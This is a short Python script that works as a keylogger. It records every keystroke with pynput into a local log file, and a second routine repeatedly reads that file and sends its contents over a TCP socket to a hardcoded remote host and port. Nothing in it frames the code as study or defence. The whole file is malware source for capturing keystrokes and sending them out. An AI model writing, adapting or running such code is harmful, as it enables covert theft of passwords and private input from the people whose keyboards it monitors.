from pynput.keyboard import Key, Listener
import logging
import threading
import socket
import time
HOST = '192.168.112.128'  # The server's hostname or IP address
PORT = 65432        # The port used by the server



def loggs():
	print("logger start")
	logging.basicConfig(filename=("/root/saravana/python/revershell/new-shell/keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
	def on_press(key):
		logging.info(str(key))
	with Listener(on_press=on_press) as listener :
		listener.join()

def sender():
	print("sender start...!")
	file	=open('/root/saravana/python/revershell/new-shell/keylog.txt','r')
	f=file.read()
	data=f.encode('utf8')
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((HOST, PORT))
		s.sendall(data)
		time.sleep(10)
		print("sending..!")


if __name__ == "__main__":
	t1 = threading.Thread(target=loggs)
	t2 = threading.Thread(target=sender)
	t1.start()
	t2.start()
	while True:
		sender()

